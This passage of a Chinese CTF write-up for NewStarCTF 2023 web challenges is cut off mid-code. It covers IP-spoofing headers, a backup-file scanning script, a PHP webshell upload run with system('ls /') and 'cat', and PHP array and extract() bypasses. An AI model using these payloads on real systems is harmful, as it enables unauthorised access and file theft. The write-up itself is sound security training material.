class="hljs txt">User-Agent:NewStarCTF2023<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134804370.png" alt="image-20230926134804370"></p><p>告诉我们访问的源网页地址是newstarctf.com:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:newstarctf.com<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135002273.png" alt="image-20230926135002273"></p><p>最后我们需要伪造本地用户访问,这里提供了一些用于伪造的字段:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br> <br>X-Forwarded:127.0.0.1<br> <br>Forwarded-For:127.0.0.1<br> <br>Forwarded:127.0.0.1<br> <br>X-Forwarded-Host:127.0.0.1<br> <br>X-remote-IP:127.0.0.1<br> <br>X-remote-addr:127.0.0.1<br> <br>True-Client-IP:127.0.0.1<br> <br>X-Client-IP:127.0.0.1<br> <br>Client-IP:127.0.0.1<br> <br>X-Real-IP:127.0.0.1<br> <br>Ali-CDN-Real-IP:127.0.0.1<br> <br>Cdn-Src-Ip:127.0.0.1<br> <br>Cdn-Real-Ip:127.0.0.1<br> <br>CF-Connecting-IP:127.0.0.1<br> <br>X-Cluster-Client-IP:127.0.0.1<br> <br>WL-Proxy-Client-IP:127.0.0.1<br> <br>Proxy-Client-IP:127.0.0.1<br> <br>Fastly-Client-Ip:127.0.0.1<br> <br>True-Client-Ip:127.0.0.1<br><br>Host: 127.0.0.1<br></code></pre></td></tr></table></figure><p>[XFF漏洞利用<a href="https://cloud.tencent.com/developer/article/2039293">通俗易懂]-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>payload:</p><p>这里我用了X-Real-IP:127.0.0.1用来伪造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Real-IP:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135303533.png" alt="image-20230926135303533"></p><p>flag&#x3D;flag{47812204-bfe7-4821-b0a5-ca4d18f44e9f}</p><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926135548124.png" alt="image-20230926135548124"></p><p>根据网页提示存在备份文件泄露：<br>访问robots.txt:<br><img src="/images/2023-10-4-Newstar-1/image-20230926135706266.png" alt="image-20230926135706266"></p><p>获得半个flag:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;r0bots_1s_s0_us3ful<br></code></pre></td></tr></table></figure><p>先使用我们的自主脚本查找网页的后台文件(后台文件目录请私聊):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;php_bak.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br>    <span class="hljs-comment"># print(bak_data)</span><br><span class="hljs-comment"># 去除换行符</span><br>bak_data = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>    bak_data.append(d.strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-comment"># print(bak_data)</span><br>url = <span class="hljs-string">&quot;http://0a2444bb-05dd-4ecf-8cbc-6e34948c0b2a.node4.buuoj.cn:81/&quot;</span><br><br><span class="hljs-keyword">for</span> bak_d <span class="hljs-keyword">in</span> bak_data:<br>    url_final = url + bak_d<br>    r = requests.get(url_final)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># print(type(r.status_code))</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">200</span> == r.status_code):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bak_d, r.status_code))<br><br><br><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;]</span><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;,&#x27;index&#x27;,&#x27;index.php&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;,&#x27;7z&#x27;,&#x27;php~&#x27;,&#x27;php&#x27;]</span><br><br><br><span class="hljs-comment"># for i in l1:</span><br><span class="hljs-comment">#     for j in l2:</span><br><span class="hljs-comment">#         print(i+&quot; &quot;+j)</span><br><span class="hljs-comment">#         url_final = url + &quot;/&quot; + i + &quot;.&quot; + j</span><br><span class="hljs-comment">#         r = requests.get(url_final)</span><br><span class="hljs-comment">#         print(r)</span><br><br><span class="hljs-comment"># 找到文件为正常响应:200</span><br><span class="hljs-comment"># www zip</span><br><span class="hljs-comment"># &lt;Response [200]&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140025030.png" alt="image-20230926140025030"></p><p>发现存在一个<a href="http://www.zip文件，访问下载后我们在index.php中发现了后面一半flag：">www.zip文件，访问下载后我们在index.php中发现了后面一半flag：</a><br><img src="/images/2023-10-4-Newstar-1/image-20230926140146599.png" alt="image-20230926140146599"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">_4nd_www.zip_1s_s0_d4ng3rous&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{r0bots_1s_s0_us3ful_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}/">www.zip_1s_s0_d4ng3rous}</a></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926140325625.png" alt="image-20230926140325625"></p><p>我们直接上传图片木马文件,并使用BP抓包:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140502172.png" alt="image-20230926140502172"></p><p>发现上传成功，我们修改一下图片文件的后缀名为php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140550913.png" alt="image-20230926140550913"></p><p>发现也上传成功，我们访问一下&#x2F;upload&#x2F;pass.php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140653179.png" alt="image-20230926140653179"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140727477.png" alt="image-20230926140727477"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat /fllll4g&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140810360.png" alt="image-20230926140810360"></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>网页代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>绕过第一个if：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//获取key1和key2的值，他们的值不能相同，但是md5的值相同，可以使用数组绕过法</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//会强制结束php进程，所以需要绕过</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?key1[]=1&amp;key2[]=2<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132411728.png" alt="image-20230927132411728"></p><p>绕过第二个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//输入的key3的值，要使它的md5值和sha1的值相同</span><br>        <span class="hljs-comment">//md5加密和sha1加密对数组的返回结果都是null</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132609158.png" alt="image-20230927132609158"></p><p>绕过第三个if：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//key4输入的值的内容和/flag中的内容进行比较，如果相同则返回0</span><br>        <span class="hljs-comment">//strcmp()如果比较的内容是一个数组，则会直接返回0</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927133350093.png" alt="image-20230927133350093"></p><p>绕过第四个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//我们需要输入一个key5的值，它的类型不能是数字，但是它的值要大于2023</span><br>        <span class="hljs-comment">//使用key5=&quot;9e9&quot;,没有绕过去</span><br>        <span class="hljs-comment">//使用key5[]=&quot;9e9&quot;,发现绕过，判断为数组类型后,由于key5现在代表的是数组，所以参与比较的是key5的地址值，地址值一般都很大</span><br>        <span class="hljs-comment">//类型判断时为数组</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134811015.png" alt="image-20230927134811015"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;1&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134955048.png" alt="image-20230927134955048"></p><p>绕过最后一个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//extract()可以通过传入的同名变量值，对已有字符集进行变量值覆盖</span><br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//$_POST获取post传入的所有参数值，并形成关联数组</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-comment">//比较post传参中的所有参数的值是否存在字母和数字</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-comment">//所以我们post传参中的所有变量的值都不能有数字和字母</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//这里存在$flag5变量，说明字符集中存在$flag5变量值，可以通过extract()函数对其进行变量覆盖</span><br>    <span class="hljs-comment">//弱if判断，只要$flag5不是0或空或null,它就会判断为true,所以只需要传入一个非字母非数字的字符即可</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-comment">//输出根目录flag文件的内容</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=@&amp;flag5=@<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927135825599.png" alt="image-20230927135825599"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-comment">//我们输入的值的md5加密后的结果的前6个字符需要是c4d038</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span 